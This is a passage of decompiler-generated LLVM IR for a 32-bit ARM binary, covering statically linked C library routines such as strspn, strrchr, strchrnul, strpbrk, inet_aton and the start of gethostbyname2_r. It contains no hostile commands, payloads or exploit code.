  %v0_1afbc = phi i32 [ %v1_1afbc, %dec_label_pc_1afb0 ], [ %v0_1af9c7, %dec_label_pc_1af28 ], [ %v1_1af50, %.backedge.backedge ]
  %v2_1afbc = icmp eq i32 %v0_1afbc, 0
  br i1 %v2_1afbc, label %dec_label_pc_1afc4, label %dec_label_pc_1afb0

dec_label_pc_1afc4:                               ; preds = %dec_label_pc_1afac
  store i32 %v3_1aef8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1afbc, { 1, 0 }
  uselistorder i32 %v1_1af50, { 1, 0, 2 }
  uselistorder i32 %v1_1af34, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_1af3436, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1af28, { 1, 0 }
  uselistorder i32 %v0_1af9c7, { 1, 2, 0 }
  uselistorder i32 %v0_1af08, { 1, 0, 2 }
  uselistorder i32 %v1_1af08, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1af00, { 1, 0 }
  uselistorder i32 %v1_1aefc, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_1aef8, { 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1afac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1af34, { 1, 0 }
  uselistorder label %dec_label_pc_1af28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1af20, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_1b0042 = load i32, i32* @r0, align 4
  %v1_1b0043 = inttoptr i32 %v0_1b0042 to i8*
  %v2_1b0044 = load i8, i8* %v1_1b0043, align 1
  %v3_1b0045 = zext i8 %v2_1b0044 to i32
  store i32 %v3_1b0045, i32* @ip, align 4
  %v2_1b0086 = icmp eq i8 %v2_1b0044, 0
  br i1 %v2_1b0086, label %dec_label_pc_1b014, label %dec_label_pc_1afe8.preheader

dec_label_pc_1afe0:                               ; preds = %dec_label_pc_1afe8
  %v3_1afe8 = zext i8 %v2_1afe8 to i32
  %v1_1aff0 = add i32 %v0_1aff0, 1
  %v9_1afe0 = icmp eq i32 %v0_1afe010, %v3_1afe8
  br i1 %v9_1afe0, label %dec_label_pc_1affc, label %dec_label_pc_1afe8

dec_label_pc_1afe8:                               ; preds = %dec_label_pc_1afe8.preheader, %dec_label_pc_1afe0
  %v0_1aff0 = phi i32 [ %tmp, %dec_label_pc_1afe8.preheader ], [ %v1_1aff0, %dec_label_pc_1afe0 ]
  %v1_1afe8 = inttoptr i32 %v0_1aff0 to i8*
  %v2_1afe8 = load i8, i8* %v1_1afe8, align 1
  %v2_1afec = icmp eq i8 %v2_1afe8, 0
  br i1 %v2_1afec, label %dec_label_pc_1b014, label %dec_label_pc_1afe0

dec_label_pc_1affc:                               ; preds = %dec_label_pc_1afe0
  %v1_1affc = add i32 %v0_1affc, 1
  store i32 %v1_1affc, i32* @lr, align 4
  %v1_1b000 = add i32 %v0_1b000, 1
  %v1_1b004 = inttoptr i32 %v1_1b000 to i8*
  %v2_1b004 = load i8, i8* %v1_1b004, align 1
  %v3_1b004 = zext i8 %v2_1b004 to i32
  store i32 %v3_1b004, i32* @ip, align 4
  %v2_1b008 = icmp eq i8 %v2_1b004, 0
  br i1 %v2_1b008, label %dec_label_pc_1b014, label %dec_label_pc_1afe8.preheader

dec_label_pc_1afe8.preheader:                     ; preds = %entry, %dec_label_pc_1affc
  %v0_1b000 = phi i32 [ %v1_1b000, %dec_label_pc_1affc ], [ %v0_1b0042, %entry ]
  %v0_1affc = phi i32 [ %v1_1affc, %dec_label_pc_1affc ], [ 0, %entry ]
  %v0_1afe010 = phi i32 [ %v3_1b004, %dec_label_pc_1affc ], [ %v3_1b0045, %entry ]
  br label %dec_label_pc_1afe8

dec_label_pc_1b014:                               ; preds = %dec_label_pc_1affc, %dec_label_pc_1afe8, %entry
  %v0_1b014 = phi i32 [ 0, %entry ], [ %v0_1affc, %dec_label_pc_1afe8 ], [ %v1_1affc, %dec_label_pc_1affc ]
  ret i32 %v0_1b014

; uselistorder directives
  uselistorder i32 %v0_1aff0, { 1, 0 }
  uselistorder label %dec_label_pc_1afe8.preheader, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_1b01c = load i32, i32* @r4, align 4
  %v1_1b020 = urem i32 %arg2, 256
  store i32 %v1_1b020, i32* @r4, align 4
  %v2_1b020 = icmp eq i32 %v1_1b020, 0
  br i1 %v2_1b020, label %dec_label_pc_1b030, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1b044

dec_label_pc_1b030:                               ; preds = %entry
  store i32 %v3_1b01c, i32* @r4, align 4
  %v2_1b038 = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_1b03c

dec_label_pc_1b03c:                               ; preds = %dec_label_pc_1b044, %dec_label_pc_1b030
  %v0_1b03c = phi i32 [ %v2_1b04c, %dec_label_pc_1b044 ], [ %v2_1b038, %dec_label_pc_1b030 ]
  store i32 %v0_1b03c, i32* @r5, align 4
  %v1_1b040 = add i32 %v0_1b03c, 1
  %v0_1b048.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b044

dec_label_pc_1b044:                               ; preds = %bb, %dec_label_pc_1b03c
  %v0_1b048 = phi i32 [ %v1_1b020, %bb ], [ %v0_1b048.pre, %dec_label_pc_1b03c ]
  %v0_1b044 = phi i32 [ %arg1, %bb ], [ %v1_1b040, %dec_label_pc_1b03c ]
  %v2_1b04c = call i32 @__GI_strchr(i32 %v0_1b044, i32 %v0_1b048)
  %v2_1b050 = icmp eq i32 %v2_1b04c, 0
  br i1 %v2_1b050, label %dec_label_pc_1b058, label %dec_label_pc_1b03c

dec_label_pc_1b058:                               ; preds = %dec_label_pc_1b044
  %v0_1b058 = load i32, i32* @r5, align 4
  ret i32 %v0_1b058

; uselistorder directives
  uselistorder i32 %v2_1b04c, { 1, 0 }
  uselistorder i32 %v0_1b03c, { 1, 0 }
  uselistorder i32 %v1_1b020, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b044, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_1b060 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_1b06c = call i32 @memcpy()
  %v0_1b070 = load i32, i32* @r5, align 4
  %v1_1b070 = load i32, i32* @r4, align 4
  %v2_1b070 = add i32 %v1_1b070, %v0_1b070
  store i32 %v6_1b060, i32* @r5, align 4
  ret i32 %v2_1b070
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1b0a4:
  %v6_1b078 = load i32, i32* @r5, align 4
  %v1_1b07c = urem i32 %arg1, 256
  %v4_1b0a4 = mul nuw nsw i32 %v1_1b07c, 256
  %v5_1b0a4 = or i32 %v4_1b0a4, %v1_1b07c
  %v4_1b0ac = mul i32 %v5_1b0a4, 65536
  %v5_1b0ac = or i32 %v4_1b0ac, %v5_1b0a4
  br label %dec_label_pc_1b0b0

dec_label_pc_1b0b0:                               ; preds = %bb58, %dec_label_pc_1b0ec, %dec_label_pc_1b0a4
  %v0_1b0b0 = phi i32 [ %v6_1b078, %dec_label_pc_1b0a4 ], [ %v4_1b0b0, %dec_label_pc_1b0ec ], [ %v4_1b0b0, %bb58 ]
  %v1_1b0b0 = inttoptr i32 %v0_1b0b0 to i32*
  %v2_1b0b0 = load i32, i32* %v1_1b0b0, align 4
  %v4_1b0b0 = add i32 %v0_1b0b0, 4
  %v2_1b0b8 = xor i32 %v2_1b0b0, %v5_1b0ac
  %v2_1b0bc = add i32 %v2_1b0b8, 2130640639
  store i32 %v2_1b0bc, i32* @ip, align 4
  %v2_1b0c4 = add i32 %v2_1b0b0, 2130640639
  %v1_1b0c8 = sub i32 -1, %v2_1b0b0
  %v2_1b0cc = xor i32 %v2_1b0c4, %v1_1b0c8
  %v1_1b0d4 = sub i32 -1, %v2_1b0b8
  %v2_1b0d8 = and i32 %v2_1b0cc, -2130640640
  %v2_1b0dc = xor i32 %v2_1b0bc, %v1_1b0d4
  %v2_1b0e0 = icmp eq i32 %v2_1b0d8, 0
  %v2_1b0e4 = and i32 %v2_1b0dc, -2130640640
  store i32 %v2_1b0e4, i32* @lr, align 4
  br i1 %v2_1b0e0, label %dec_label_pc_1b0ec, label %dec_label_pc_1b0f4

dec_label_pc_1b0ec:                               ; preds = %dec_label_pc_1b0b0
  %v2_1b0ec = icmp eq i32 %v2_1b0e4, 0
  br i1 %v2_1b0ec, label %dec_label_pc_1b0b0, label %dec_label_pc_1b0f4

dec_label_pc_1b0f4:                               ; preds = %dec_label_pc_1b0b0, %dec_label_pc_1b0ec
  %v2_1b0f4 = inttoptr i32 %v0_1b0b0 to i8*
  %v3_1b0f4 = load i8, i8* %v2_1b0f4, align 1
  %v4_1b0f4 = zext i8 %v3_1b0f4 to i32
  %v9_1b0f8 = icmp eq i32 %v4_1b0f4, %v1_1b07c
  br i1 %v9_1b0f8, label %bb, label %bb46

bb:                                               ; preds = %dec_label_pc_1b0f4
  store i32 %v6_1b078, i32* @r5, align 4
  ret i32 %v0_1b0b0

bb46:                                             ; preds = %dec_label_pc_1b0f4
  %v2_1b104 = icmp eq i8 %v3_1b0f4, 0
  br i1 %v2_1b104, label %bb47, label %bb48

bb47:                                             ; preds = %bb46
  store i32 %v6_1b078, i32* @r5, align 4
  ret i32 %v0_1b0b0

bb48:                                             ; preds = %bb46
  %v1_1b10c = add i32 %v0_1b0b0, 1
  %v2_1b10c = inttoptr i32 %v1_1b10c to i8*
  %v3_1b10c = load i8, i8* %v2_1b10c, align 1
  %v4_1b10c = zext i8 %v3_1b10c to i32
  %v9_1b110 = icmp eq i32 %v4_1b10c, %v1_1b07c
  br i1 %v9_1b110, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v6_1b078, i32* @r5, align 4
  ret i32 %v1_1b10c

bb50:                                             ; preds = %bb48
  %v2_1b11c = icmp eq i8 %v3_1b10c, 0
  br i1 %v2_1b11c, label %bb51, label %bb52

bb51:                                             ; preds = %bb50
  store i32 %v6_1b078, i32* @r5, align 4
  ret i32 %v1_1b10c

bb52:                                             ; preds = %bb50
  %v1_1b124 = add i32 %v0_1b0b0, 2
  %v2_1b124 = inttoptr i32 %v1_1b124 to i8*
  %v3_1b124 = load i8, i8* %v2_1b124, align 1
  %v4_1b124 = zext i8 %v3_1b124 to i32
  %v9_1b128 = icmp eq i32 %v4_1b124, %v1_1b07c
  br i1 %v9_1b128, label %bb53, label %bb54

bb53:                                             ; preds = %bb52
  store i32 %v6_1b078, i32* @r5, align 4
  ret i32 %v1_1b124

bb54:                                             ; preds = %bb52
  %v2_1b134 = icmp eq i8 %v3_1b124, 0
  br i1 %v2_1b134, label %bb55, label %bb56

bb55:                                             ; preds = %bb54
  store i32 %v6_1b078, i32* @r5, align 4
  ret i32 %v1_1b124

bb56:                                             ; preds = %bb54
  %v1_1b13c = add i32 %v0_1b0b0, 3
  %v2_1b13c = inttoptr i32 %v1_1b13c to i8*
  %v3_1b13c = load i8, i8* %v2_1b13c, align 1
  %v4_1b13c = zext i8 %v3_1b13c to i32
  %v9_1b140 = icmp eq i32 %v4_1b13c, %v1_1b07c
  br i1 %v9_1b140, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  store i32 %v6_1b078, i32* @r5, align 4
  ret i32 %v1_1b13c

bb58:                                             ; preds = %bb56
  %v2_1b14c = icmp eq i8 %v3_1b13c, 0
  br i1 %v2_1b14c, label %dec_label_pc_1b154, label %dec_label_pc_1b0b0

dec_label_pc_1b154:                               ; preds = %bb58
  store i32 %v6_1b078, i32* @r5, align 4
  ret i32 %v1_1b13c

; uselistorder directives
  uselistorder i32 %v1_1b13c, { 1, 0, 2 }
  uselistorder i32 %v1_1b124, { 1, 0, 2 }
  uselistorder i32 %v1_1b10c, { 1, 0, 2 }
  uselistorder i32 %v4_1b0b0, { 1, 0 }
  uselistorder i32 %v2_1b0b0, { 0, 2, 1 }
  uselistorder i32 %v0_1b0b0, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_1b0a4, { 1, 0 }
  uselistorder i32 %v1_1b07c, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v6_1b078, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 -2130640640, { 1, 2, 7, 3, 0, 8, 4, 5, 6 }
  uselistorder i32 2130640639, { 0, 4, 1, 5, 2, 3, 6 }
  uselistorder label %dec_label_pc_1b0f4, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_1b18c3 = load i8, i8* %arg1, align 1
  %v3_1b18c4 = zext i8 %v2_1b18c3 to i32
  %v2_1b1905 = icmp eq i8 %v2_1b18c3, 0
  br i1 %v2_1b1905, label %dec_label_pc_1b18c._crit_edge, label %.lr.ph

dec_label_pc_1b168:                               ; preds = %dec_label_pc_1b178
  %v1_1b180 = add i32 %v0_1b180, 1
  %v9_1b168 = icmp eq i32 %v3_1b178, %v3_1b18c6
  br i1 %v9_1b168, label %dec_label_pc_1b170, label %dec_label_pc_1b178

dec_label_pc_1b170:                               ; preds = %dec_label_pc_1b168
  ret i32 %v0_1b188

dec_label_pc_1b178:                               ; preds = %dec_label_pc_1b168, %.lr.ph
  %v0_1b180 = phi i32 [ %v1_1b180, %dec_label_pc_1b168 ], [ %arg2, %.lr.ph ]
  %v1_1b178 = inttoptr i32 %v0_1b180 to i8*
  %v2_1b178 = load i8, i8* %v1_1b178, align 1
  %v3_1b178 = zext i8 %v2_1b178 to i32
  store i32 %v3_1b178, i32* @ip, align 4
  %v2_1b17c = icmp eq i8 %v2_1b178, 0
  br i1 %v2_1b17c, label %dec_label_pc_1b188, label %dec_label_pc_1b168

dec_label_pc_1b188:                               ; preds = %dec_label_pc_1b178
  %v1_1b188 = add i32 %v0_1b188, 1
  %v1_1b18c = inttoptr i32 %v1_1b188 to i8*
  %v2_1b18c = load i8, i8* %v1_1b18c, align 1
  %v3_1b18c = zext i8 %v2_1b18c to i32
  %v2_1b190 = icmp eq i8 %v2_1b18c, 0
  br i1 %v2_1b190, label %dec_label_pc_1b18c._crit_edge, label %.lr.ph

dec_label_pc_1b18c._crit_edge:                    ; preds = %dec_label_pc_1b188, %entry
  %v3_1b18c.lcssa = phi i32 [ %v3_1b18c4, %entry ], [ %v3_1b18c, %dec_label_pc_1b188 ]
  ret i32 %v3_1b18c.lcssa

.lr.ph:                                           ; preds = %entry, %dec_label_pc_1b188
  %v0_1b188 = phi i32 [ %v1_1b188, %dec_label_pc_1b188 ], [ %tmp, %entry ]
  %v3_1b18c6 = phi i32 [ %v3_1b18c, %dec_label_pc_1b188 ], [ %v3_1b18c4, %entry ]
  br label %dec_label_pc_1b178

; uselistorder directives
  uselistorder i32 %v3_1b18c, { 1, 0 }
  uselistorder i32 %v3_1b178, { 1, 0 }
  uselistorder i32 %v0_1b180, { 1, 0 }
  uselistorder label %.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1b178, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_1b1a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b1a0 = icmp eq i32 %v0_1b1a0, 0
  %v3_1b1a4 = load i32, i32* @r4, align 4
  store i32 %v3_1b1a4, i32* %stack_var_-32, align 4
  br i1 %v2_1b1a0, label %dec_label_pc_1b274, label %dec_label_pc_1b1b0

dec_label_pc_1b1b0:                               ; preds = %entry
  %v2_1b1cc.pre = load i32, i32* @global_var_2e1e4, align 4
  br label %dec_label_pc_1b1c8

dec_label_pc_1b1c8:                               ; preds = %dec_label_pc_1b1b0, %dec_label_pc_1b250
  %v1_1b250 = phi i32 [ 0, %dec_label_pc_1b1b0 ], [ %v5_1b250, %dec_label_pc_1b250 ]
  %v0_1b254 = phi i32 [ 1, %dec_label_pc_1b1b0 ], [ %v1_1b254, %dec_label_pc_1b250 ]
  %v0_1b1c8 = phi i32 [ %v0_1b1a0, %dec_label_pc_1b1b0 ], [ %v0_1b1c85, %dec_label_pc_1b250 ]
  %v1_1b1c8 = inttoptr i32 %v0_1b1c8 to i8*
  %v2_1b1c8 = load i8, i8* %v1_1b1c8, align 1
  %v3_1b1c8 = zext i8 %v2_1b1c8 to i32
  %v2_1b1d0 = mul nuw nsw i32 %v3_1b1c8, 2
  %v2_1b1d4 = add i32 %v2_1b1d0, %v2_1b1cc.pre
  %v1_1b1d8 = add i32 %v2_1b1d4, 1
  %v2_1b1d8 = inttoptr i32 %v1_1b1d8 to i8*
  %v3_1b1d8 = load i8, i8* %v2_1b1d8, align 1
  %v1_1b1dc = and i8 %v3_1b1d8, 8
  %v2_1b1dc = icmp eq i8 %v1_1b1dc, 0
  br i1 %v2_1b1dc, label %dec_label_pc_1b274, label %dec_label_pc_1b1e4

dec_label_pc_1b1e4:                               ; preds = %dec_label_pc_1b1c8
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_1b204

dec_label_pc_1b1ec:                               ; preds = %dec_label_pc_1b204
  %v2_1b1ec = mul i32 %v0_1b250, 10
  %v1_1b1f0 = add i32 %v2_1b1ec, -48
  %v2_1b1f4 = add i32 %v3_1b204, %v1_1b1f0
  store i32 %v2_1b1f4, i32* @lr, align 4
  %v8_1b1fc = icmp sgt i32 %v2_1b1f4, 255
  br i1 %v8_1b1fc, label %dec_label_pc_1b274, label %dec_label_pc_1b200

dec_label_pc_1b200:                               ; preds = %dec_label_pc_1b1ec
  %v1_1b200 = add i32 %v0_1b240, 1
  store i32 %v1_1b200, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b204

dec_label_pc_1b204:                               ; preds = %dec_label_pc_1b1e4, %dec_label_pc_1b200
  %v0_1b250 = phi i32 [ 0, %dec_label_pc_1b1e4 ], [ %v2_1b1f4, %dec_label_pc_1b200 ]
  %v0_1b240 = phi i32 [ %v0_1b1c8, %dec_label_pc_1b1e4 ], [ %v1_1b200, %dec_label_pc_1b200 ]
  %v1_1b204 = inttoptr i32 %v0_1b240 to i8*
  %v2_1b204 = load i8, i8* %v1_1b204, align 1
  %v3_1b204 = zext i8 %v2_1b204 to i32
  %v2_1b208 = mul nuw nsw i32 %v3_1b204, 2
  %v2_1b20c = add i32 %v2_1b208, %v2_1b1cc.pre
  %v1_1b214 = add i32 %v2_1b20c, 1
  %v2_1b214 = inttoptr i32 %v1_1b214 to i8*
  %v3_1b214 = load i8, i8* %v2_1b214, align 1
  %v4_1b214 = zext i8 %v3_1b214 to i32
  %v1_1b21c = and i32 %v4_1b214, 8
  %v2_1b21c = icmp eq i32 %v1_1b21c, 0
  br i1 %v2_1b21c, label %dec_label_pc_1b224, label %dec_label_pc_1b1ec

dec_label_pc_1b224:                               ; preds = %dec_label_pc_1b204
  %v7_1b224 = icmp eq i32 %v0_1b254, 4
  br i1 %v7_1b224, label %dec_label_pc_1b23c, label %dec_label_pc_1b22c

dec_label_pc_1b22c:                               ; preds = %dec_label_pc_1b224
  %v7_1b22c = icmp eq i8 %v2_1b204, 46
  br i1 %v7_1b22c, label %dec_label_pc_1b234, label %dec_label_pc_1b274

dec_label_pc_1b234:                               ; preds = %dec_label_pc_1b22c
  %v1_1b234 = add i32 %v0_1b240, 1
  store i32 %v1_1b234, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b250

dec_label_pc_1b23c:                               ; preds = %dec_label_pc_1b224
  %v2_1b23c = icmp eq i8 %v2_1b204, 0
  %v1_1b240 = add i32 %v0_1b240, 1
  store i32 %v1_1b240, i32* %r0.global-to-local, align 4
  br i1 %v2_1b23c, label %dec_label_pc_1b250, label %dec_label_pc_1b248

dec_label_pc_1b248:                               ; preds = %dec_label_pc_1b23c
  %v1_1b248 = and i32 %v4_1b214, 32
  %v2_1b248 = icmp eq i32 %v1_1b248, 0
  br i1 %v2_1b248, label %dec_label_pc_1b274, label %dec_label_pc_1b250

dec_label_pc_1b250:                               ; preds = %dec_label_pc_1b248, %dec_label_pc_1b23c, %dec_label_pc_1b234
  %v0_1b1c85 = phi i32 [ %v1_1b240, %dec_label_pc_1b248 ], [ %v1_1b240, %dec_label_pc_1b23c ], [ %v1_1b234, %dec_label_pc_1b234 ]
  %v4_1b250 = mul i32 %v1_1b250, 256
  %v5_1b250 = or i32 %v0_1b250, %v4_1b250
  %v1_1b254 = add nuw nsw i32 %v0_1b254, 1
  %v7_1b25c = icmp slt i32 %v1_1b254, 5
  br i1 %v7_1b25c, label %dec_label_pc_1b1c8, label %dec_label_pc_1b260

dec_label_pc_1b260:                               ; preds = %dec_label_pc_1b250
  %v2_1b260 = icmp eq i32 %arg2, 0
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v2_1b260, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1b260
  %v3_1b26c = inttoptr i32 %arg2 to i32*
  store i32 %v5_1b250, i32* %v3_1b26c, align 4
  %v2_1b270.pre = load i32, i32* %stack_var_-32, align 4
  %v26_1b270.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1b260, %bb
  %v26_1b270 = phi i32 [ %v26_1b270.pre, %bb ], [ 1, %dec_label_pc_1b260 ]
  %v2_1b270 = phi i32 [ %v2_1b270.pre, %bb ], [ %v3_1b1a4, %dec_label_pc_1b260 ]
  store i32 %v2_1b270, i32* @r4, align 4
  ret i32 %v26_1b270

dec_label_pc_1b274:                               ; preds = %dec_label_pc_1b22c, %dec_label_pc_1b248, %dec_label_pc_1b1c8, %dec_label_pc_1b1ec, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_1b1a4, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1b254, { 1, 0 }
  uselistorder i32 %v0_1b240, { 0, 1, 3, 2 }
  uselistorder i32 %v3_1b1a4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder label %dec_label_pc_1b274, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1b204, { 1, 0 }
  uselistorder label %dec_label_pc_1b1c8, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %v9_1b280 = load i32, i32* @r6, align 4
  %v12_1b280 = load i32, i32* @r7, align 4
  %v15_1b280 = load i32, i32* @r8, align 4
  %v18_1b280 = load i32, i32* @sb, align 4
  %v21_1b280 = load i32, i32* @sl, align 4
  %v24_1b280 = load i32, i32* @fp, align 4
  %v7_1b284 = icmp eq i32 %arg2, 2
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg5, i32* @sl, align 4
  store i32 %arg7, i32* @fp, align 4
  br i1 %v7_1b284, label %dec_label_pc_1b2a8, label %dec_label_pc_1b2c8

dec_label_pc_1b2a8:                               ; preds = %entry
  store i32 %arg6, i32* @ip, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  %v0_1b2c0 = call i32 @gethostbyname_r()
  store i32 %v0_1b2c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b510

dec_label_pc_1b2c8:                               ; preds = %entry
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v7_1b2d0 = icmp eq i32 %arg2, 10
  %v2_1b2d4 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v2_1b2d4, align 4
  br i1 %v7_1b2d0, label %dec_label_pc_1b2dc, label %dec_label_pc_1b50c

dec_label_pc_1b2dc:                               ; preds = %dec_label_pc_1b2c8
  %v1_1b2dc = load i32, i32* @r7, align 4
  %v9_1b2dc = icmp eq i32 %v1_1b2dc, %arg1
  br i1 %v9_1b2dc, label %dec_label_pc_1b50c, label %dec_label_pc_1b2e4

dec_label_pc_1b2e4:                               ; preds = %dec_label_pc_1b2dc
  %v0_1b2e4 = call i32 @__GI___errno_location()
  store i32 %v0_1b2e4, i32* %r0.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_1b2e4, i32* @r5, align 4
  %v0_1b2f0 = load i32, i32* @r4, align 4
  %v0_1b2f4 = load i32, i32* @r6, align 4
  store i32 %v0_1b2f4, i32* %r2.global-to-local, align 4
  %v1_1b2f8 = inttoptr i32 %v0_1b2e4 to i32*
  %v2_1b2f8 = load i32, i32* %v1_1b2f8, align 4
  store i32 %v2_1b2f8, i32* @r4, align 4
  %v0_1b2fc = load i32, i32* @r8, align 4
  store i32 %v0_1b2fc, i32* %r3.global-to-local, align 4
  %v0_1b300 = load i32, i32* @r7, align 4
  store i32 %v0_1b300, i32* %v1_1b2f8, align 4
  %v0_1b304 = load i32, i32* @sb, align 4
  store i32 %v0_1b304, i32* %r0.global-to-local, align 4
  %v2_1b308 = load i32, i32* @sl, align 4
  %v5_1b308 = load i32, i32* %ip.global-to-local, align 4
  %v0_1b30c = load i32, i32* @fp, align 4
  %v7_1b310 = call i32 @__get_hosts_byname_r(i32 %v0_1b304, i32 %v0_1b2f0, i32 %v0_1b2f4, i32 %v0_1b2fc, i32 %v2_1b308, i32 %v5_1b308, i32 %v0_1b30c)
  store i32 %v7_1b310, i32* %r0.global-to-local, align 4
  %v2_1b314 = icmp eq i32 %v7_1b310, 0
  br i1 %v2_1b314, label %bb, label %dec_label_pc_1b320

bb:                                               ; preds = %dec_label_pc_1b2e4
  %v1_1b318 = load i32, i32* @r4, align 4
  %v2_1b318 = load i32, i32* @r5, align 4
  %v3_1b318 = inttoptr i32 %v2_1b318 to i32*
  store i32 %v1_1b318, i32* %v3_1b318, align 4
  br label %dec_label_pc_1b510

dec_label_pc_1b320:                               ; preds = %dec_label_pc_1b2e4
  %v0_1b320 = load i32, i32* @fp, align 4
  %v1_1b320 = inttoptr i32 %v0_1b320 to i32*
  %v2_1b320 = load i32, i32* %v1_1b320, align 4
  store i32 %v2_1b320, i32* %r3.global-to-local, align 4
  %v7_1b324 = icmp eq i32 %v2_1b320, 1
  br i1 %v7_1b324, label %dec_label_pc_1b340, label %dec_label_pc_1b32c

dec_label_pc_1b32c:                               ; preds = %dec_label_pc_1b320
  %v7_1b32c = icmp eq i32 %v2_1b320, 4
  br i1 %v7_1b32c, label %dec_label_pc_1b35c, label %dec_label_pc_1b334

dec_label_pc_1b334:                               ; preds = %dec_label_pc_1b32c
  %v3_1b334 = icmp eq i32 %v2_1b320, -1
  br i1 %v3_1b334, label %dec_label_pc_1b350, label %dec_label_pc_1b510

dec_label_pc_1b340:                               ; preds = %dec_label_pc_1b320
  %v7_1b340 = icmp eq i32 %v7_1b310, 2
  br i1 %v7_1b340, label %.thread1, label %bb28

bb28:                                             ; preds = %dec_label_pc_1b340
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1b360

.thread1:                                         ; preds = %dec_label_pc_1b340
  store i32 1, i32* @r7, align 4
  br label %dec_label_pc_1b360

dec_label_pc_1b350:                               ; preds = %dec_label_pc_1b334
  %v0_1b350 = load i32, i32* @r5, align 4
  %v1_1b350 = inttoptr i32 %v0_1b350 to i32*
  %v2_1b350 = load i32, i32* %v1_1b350, align 4
  store i32 %v2_1b350, i32* %r3.global-to-local, align 4
  %v7_1b354 = icmp eq i32 %v2_1b350, 2
  br i1 %v7_1b354, label %dec_label_pc_1b35c, label %dec_label_pc_1b510

dec_label_pc_1b35c:                               ; preds = %dec_label_pc_1b350, %dec_label_pc_1b32c
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1b360

dec_label_pc_1b360:                               ; preds = %bb28, %.thread1, %dec_label_pc_1b35c
  %v0_1b360 = load i32, i32* @r8, align 4
  %v1_1b360 = sub i32 0, %v0_1b360
  %v1_1b364 = urem i32 %v1_1b360, 4
  store i32 %v1_1b364, i32* %r0.global-to-local, align 4
  %v1_1b368 = load i32, i32* @sl, align 4
  %v2_1b368 = sub i32 %v1_1b368, %v1_1b364
  %v1_1b36c = add i32 %v2_1b368, -24
  store i32 %v1_1b36c, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
